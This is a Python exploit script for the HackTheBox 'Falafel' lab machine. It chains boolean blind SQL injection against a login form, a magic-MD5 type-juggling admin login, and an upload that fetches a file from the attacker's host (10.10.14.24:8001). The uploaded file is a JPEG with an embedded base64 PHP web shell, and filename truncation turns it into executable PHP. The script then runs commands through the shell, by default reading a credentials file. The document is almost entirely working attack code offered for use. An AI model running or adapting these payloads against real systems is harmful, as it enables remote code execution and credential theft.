import requests
import argparse
import base64
import time

parser = argparse.ArgumentParser(description='Blind SQL Injection Boolean (Falafel hackthebox)')

parser.add_argument("--hostname", default='http://10.10.10.73/', type=str,
                    help="Hostname of falafel box")
parser.add_argument("--command", default='cat /var/www/html/connection.php', type=str,
                    help="Command to execute on Falafel")

args = parser.parse_args()


def run_injection(session, column, char_limit):
    result = []
    char = 47
    limit = 1
    while char != 123 and limit != char_limit:
        """
        https://www.w3resource.com/mysql/string-functions/mysql-ord-function.php
        https://www.w3resource.com/mysql/string-functions/mysql-mid-function.php
        """
        login = {
            'password': 'chris',
            'username': "chris' AND ORD(MID((SELECT " + column + " FROM falafel.users WHERE username = 'admin' ORDER BY 'ID' LIMIT 0,1)," + str(limit) + ",1))>" + str(char) + "-- ORBZ"
        }

        response = session.post(args.hostname + "/login.php", data=login)
        # SUCCESS,
        if "Wrong identification" not in response.text:
            result.append(char)
            limit += 1
            char = 47
        # FAIL
        else:
            char += 1
    return result

def create_php_backdoor():
    imgBackdoor = """
            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
        """
    try:
        filename_length = len(str("A"*232 + ".php.jpg"))
        print('Filename length :' + str(filename_length))
        with open(str("A"*232 + ".php.jpg"), "wb") as f:
            f.write(base64.b64decode(imgBackdoor))
    except Exception as e:
        print(str(e))
        exit(0)


def main():
    session = requests.session()
    print("Exploit started, you should have launched your netcat and 'python -m SimpleHTTPServer 8001' listener before")
    create_php_backdoor()

    # admin_password = run_injection(session, "password", 65)
    # admin_password = ''.join(chr(i) for i in admin_password)
    # print("md5:" + admin_password.split("/")[0])

    # https://github.com/spaze/hashes/blob/master/md5.md
    admin_login = {
        # Magic md5 hash result
        'password': '240610708',
        'username': "admin"
    }

    session_admin = requests.session()
    response_a = session_admin.post(args.hostname + "/login.php", data=admin_login)
    if "Login Successful!" not in response_a.text:
        print("Wrong password for admin, check magic md5 hashes")
        exit(0)

    response = session_admin.post(args.hostname + "/upload.php",
                                  data={"url": "http://10.10.14.24:8001/" + "A" * 232 + ".php.jpg"})

    result = [line for line in response.text.split('\n') if "New name is" in line]
    print("File saved under extention: " + result[0].split('.')[1])

    file_location = "http://10.10.10.73/uploads/" + \
                    [line for line in response.text.split('\n') if "<pre>CMD" in line][0].split("/")[5].split(";")[
                        0] + "/" + result[0].split(" ")[3]
    file_location = file_location[:-1]
    print(file_location)

    cmd_r = session.get(file_location + "?cmd="+ args.command)
    print(cmd_r.text.split('<pre>')[1])


main()
